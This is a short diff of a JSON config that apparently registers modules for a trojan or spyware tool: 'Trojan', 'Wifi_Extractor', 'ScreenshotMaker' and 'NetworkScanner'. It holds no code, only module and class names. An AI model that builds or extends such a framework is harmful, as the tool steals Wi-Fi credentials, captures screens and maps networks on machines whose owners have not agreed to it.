@@ -1,6 +1,6 @@
-[
-	
-	{
-	"module" : "network_discovery"
-	}
-]
+{
+        "trojan": {"module": "Trojan", "class": "Trojan"},
+        "wifi_info": {"module": "Wifi_Extractor", "class": "Wifi_Extractor"},
+        "screenshot": {"module": "ScreenshotMaker", "class": "ScreenshotMaker"},
+        "network_discovery": {"module": "NetworkScanner", "class": "NetworkScanner"}
+    }
